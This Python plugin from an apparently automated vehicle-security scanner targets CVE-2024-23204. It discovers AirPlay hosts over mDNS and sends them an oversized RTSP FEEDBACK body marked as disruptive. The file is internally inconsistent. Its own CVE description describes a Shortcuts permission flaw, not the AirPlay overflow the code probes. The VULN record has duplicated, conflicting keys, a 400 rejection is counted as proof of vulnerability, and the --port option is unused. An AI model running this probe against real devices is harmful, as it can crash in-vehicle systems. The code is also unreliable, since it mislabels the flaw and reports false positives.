#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import socket
import struct

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


def _mdns_query_airplay(timeout: float = 3.0):
    """Send mDNS PTR query for _airplay._tcp.local. and collect responses."""
    service = "_airplay._tcp.local."
    query = b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'
    for part in service.rstrip('.').split('.'):
        query += bytes([len(part)]) + part.encode()
    query += b'\x00\x00\x0c\x00\x01'
    found = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(timeout)
        sock.sendto(query, ("224.0.0.251", 5353))
        while True:
            try:
                data, addr = sock.recvfrom(4096)
                found.append({"addr": addr[0], "len": len(data)})
            except socket.timeout:
                break
        sock.close()
    except OSError:
        pass
    return found


def _rtsp_probe(host: str, port: int, method: str, path: str,
                headers: dict, body: bytes = b"") -> dict:
    """Send a raw RTSP request and return status line + response size."""
    header_lines = "\r\n".join(f"{k}: {v}" for k, v in headers.items())
    request = (
        f"{method} {path} RTSP/1.0\r\n"
        f"{header_lines}\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
    ).encode() + body
    result = {"connected": False, "status": "", "response_len": 0, "error": ""}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5.0)
        sock.connect((host, port))
        result["connected"] = True
        sock.sendall(request)
        resp = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp += chunk
            if b"\r\n\r\n" in resp:
                break
        sock.close()
        result["response_len"] = len(resp)
        if resp:
            result["status"] = resp.split(b"\r\n")[0].decode(errors="replace")
    except ConnectionRefusedError:
        result["error"] = "connection_refused"
    except socket.timeout:
        result["error"] = "timeout"
    except OSError as exc:
        result["error"] = str(exc)
    return result


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    airplay_port = int(params.get("airplay_port", 7000))

    evidence = {
        "cve": "CVE-2024-23204",
        "target": target_ip,
        "technique": "AirPlay mDNS discovery + crafted RTSP FEEDBACK overflow probe",
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-23204",
    }

    mdns_found = _mdns_query_airplay(timeout=2.0)
    evidence["mdns_airplay_responses"] = mdns_found

    body = b"A" * 4096
    result = _rtsp_probe(
        target_ip, airplay_port,
        "POST", "/feedback",
        {"CSeq": "7", "Content-Type": "application/x-apple-binary-plist"},
        body,
    )
    evidence["rtsp_probe"] = result

    if not result["connected"]:
        vulnerable = None
        evidence["note"] = "AirPlay port unreachable; manual verification required"
    elif "200" in result["status"] or "400" in result["status"]:
        vulnerable = True
        evidence["note"] = "Target accepted oversized FEEDBACK body; potential memory corruption surface exposed"
    else:
        vulnerable = None
        evidence["note"] = f"Unexpected response: {result['status']}"

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": vulnerable is None,
    }


VULN = {
    'cve': 'CVE-2024-23204',
    'year': 2024,
    'domain': 'application',
    'vendor_product': 'Unknown',
    'component': 'Unknown',
    'type': 'Unknown',
    'summary': 'CVE-2024-23204 内存破坏/协议缺陷 Active Validation',
    'source_url': 'https://nvd.nist.gov/vuln/detail/CVE-2024-23204',
    'affected': [{'vendor': 'Unknown', 'product': 'Unknown', 'versions': []}],
    'id': 0,
    "id": 82,
    "cve": "CVE-2024-23204",
    "year": 2024,
    "domain": "车载互联/CarPlay相关",
    "vendor_product": "Apple AirPlay/CarPlay ecosystem",
    "component": "AirPlay SDK",
    "type": "内存破坏/协议缺陷",
    "summary": "AirPlay/CarPlay生态相关协议漏洞之一，第三方车载设备可能受影响。",
    "source_description": "The issue was addressed with additional permissions checks. This issue is fixed in iOS 16.7.6 and iPadOS 16.7.6, iOS 17.3 and iPadOS 17.3, macOS Monterey 12.7.4, macOS Sonoma 14.3, macOS Ventura 13.6.5, watchOS 10.3. A shortcut may be able to use sensitive data with certain actions without prompting the user.",
    "poc_status": "有公开研究；PoC有限",
    "research_value": "作为智能网联汽车常见基础组件/无线协议/车载互联依赖的关联漏洞纳入。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-23204",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-23204",
        "https://support.apple.com/en-us/120304",
        "https://support.apple.com/en-us/120306",
        "https://support.apple.com/en-us/120309",
        "https://support.apple.com/en-us/120880",
        "https://support.apple.com/en-us/120884",
        "https://support.apple.com/en-us/120886",
        "https://cveawg.mitre.org/api/cve/CVE-2024-23204"
    ],
    "affected": [
        {
            "vendor": "Apple",
            "product": "iOS and iPadOS",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "16.7.6",
                    "versionType": "custom"
                },
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "17.3",
                    "versionType": "custom"
                }
            ]
        },
        {
            "vendor": "Apple",
            "product": "macOS",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "12.7.4",
                    "versionType": "custom"
                },
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "13.6.5",
                    "versionType": "custom"
                },
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "14.3",
                    "versionType": "custom"
                }
            ]
        },
        {
            "vendor": "Apple",
            "product": "watchOS",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThan": "10.3",
                    "versionType": "custom"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2024-23204",
        "Apple",
        "AirPlay",
        "CarPlay",
        "ecosystem",
        "SDK",
        "issue",
        "addressed",
        "additional",
        "permissions",
        "checks",
        "fixed",
        "iPadOS",
        "macOS",
        "Monterey",
        "Sonoma",
        "Ventura",
        "watchOS",
        "shortcut",
        "able",
        "sensitive",
        "data",
        "certain",
        "actions",
        "without",
        "prompting",
        "user",
        "iOS and iPadOS"
    ],
    "active_probe_paths": ["/server-info"],
    "active_payload_text": "POST /feedback RTSP/1.0\r\nCSeq: 7\r\nContent-Type: application/x-apple-binary-plist\r\nContent-Length: 4096\r\n\r\n" + "A" * 4096,
}


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc59CVE202423204ExposureAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-082'
    meta_poc_name = 'CVE-2024-23204 协议缺陷 Active Validation'
    meta_cve_id = 'CVE-2024-23204'
    meta_severity = 'High'
    meta_protocol = 'airplay'
    meta_target_os = ['all']
    meta_required_params = ['software_inventory_text']
    meta_profiles = ['application']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-23204'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2024-23204']
    meta_attack_surface = '车机APP/应用'
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "59_AirPlay_SDK_Memory_Corruption_Audit") if "VULN" in dir() else "59_AirPlay_SDK_Memory_Corruption_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc59CVE202423204ExposureAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
